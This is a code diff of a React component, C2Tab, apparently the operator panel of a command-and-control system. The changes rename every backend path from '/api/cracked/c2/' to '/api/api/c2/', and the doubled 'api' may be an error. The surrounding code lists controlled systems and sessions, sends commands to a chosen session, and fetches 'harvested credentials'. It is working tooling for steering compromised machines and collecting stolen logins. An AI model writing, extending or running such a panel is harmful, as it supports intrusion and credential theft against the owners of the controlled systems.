@@ -61,7 +61,7 @@ const C2Tab = () => {
   // Fetch dashboard overview
   const fetchDashboard = useCallback(async () => {
     try {
-      const response = await adminFetch("/api/cracked/c2/dashboard");
+      const response = await adminFetch("/api/api/c2/dashboard");
       if (!response.ok) {
         throw new Error("Failed to fetch C2 dashboard data");
       }
@@ -82,7 +82,7 @@ const C2Tab = () => {
   const fetchSystems = useCallback(async () => {
     setLoading(true);
     try {
-      const response = await adminFetch("/api/cracked/c2/sessions");
+      const response = await adminFetch("/api/api/c2/sessions");
       if (!response.ok) {
         throw new Error("Failed to fetch C2 sessions");
       }
@@ -193,7 +193,7 @@ const C2Tab = () => {
     
     try {
       // Fetch detailed system info
-      const response = await adminFetch(`/api/cracked/c2/sessions/${system.session_id}`);
+      const response = await adminFetch(`/api/api/c2/sessions/${system.session_id}`);
       if (!response.ok) {
         throw new Error("Failed to fetch system details");
       }
@@ -208,7 +208,7 @@ const C2Tab = () => {
         // Get commands for this system
         try {
           const commandsResponse = await adminFetch(
-            `/api/cracked/c2/sessions/${system.session_id}/commands`
+            `/api/api/c2/sessions/${system.session_id}/commands`
           );
           if (commandsResponse.ok) {
             const commandsData = await commandsResponse.json();
@@ -270,7 +270,7 @@ const C2Tab = () => {
     try {
       // Send command to backend
       const response = await adminFetch(
-        `/api/cracked/c2/sessions/${selectedSystem.session_id}/command`,
+        `/api/api/c2/sessions/${selectedSystem.session_id}/command`,
         {
           method: "POST",
           headers: {
@@ -335,7 +335,7 @@ const C2Tab = () => {
   // Fetch all harvested credentials
   const fetchAllCredentials = useCallback(async () => {
     try {
-      const response = await adminFetch("/api/cracked/c2/credentials");
+      const response = await adminFetch("/api/api/c2/credentials");
       if (!response.ok) {
         throw new Error("Failed to fetch credentials");
       }
